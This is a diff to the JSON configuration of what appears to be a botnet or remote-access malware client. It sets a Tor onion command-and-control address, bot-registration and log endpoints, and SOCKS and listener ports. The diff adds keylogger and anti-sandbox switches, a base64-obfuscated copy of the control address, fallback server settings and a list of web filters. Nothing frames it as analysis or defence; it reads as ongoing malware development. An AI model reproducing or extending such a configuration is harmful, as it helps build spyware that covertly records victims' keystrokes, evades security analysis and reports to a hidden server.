@@ -13,14 +13,26 @@
   "Variables": {
     "Debug": true,
     "Address": "u3pnecjj63qycnhl.onion",
+    "FallbackAdress": "",
     "CertifiedKey": "x9ltmw6nnt",
     "SocketPort": 9150,
     "ServerReachPort": 44359,
+    "FallbackServerReachPort": 44359,
     "ReachPort": 50371,
-    "ListenerPort": 5557
+    "ListenerPort": 5557,
+    "AntiSandbox": true,
+    "Keyloggers": true,
+    "WebMasterAddress": "dTNwbmVjamo2M3F5Y25obC5vbmlvbg==",
+    "WebMasterPort": "MzQzNDMzMzUzOQ=="
   },
   "UrlVariables": {
     "RegistrationUrl": "botregistration",
     "LogUrl": "log"
-  }
+  },
+  "WebFilters": [
+    "https://google.hu/",
+    "https://youtube.com/",
+    "https://stackoverflow.com/",
+    "https://github.com/"
+  ] 
 }
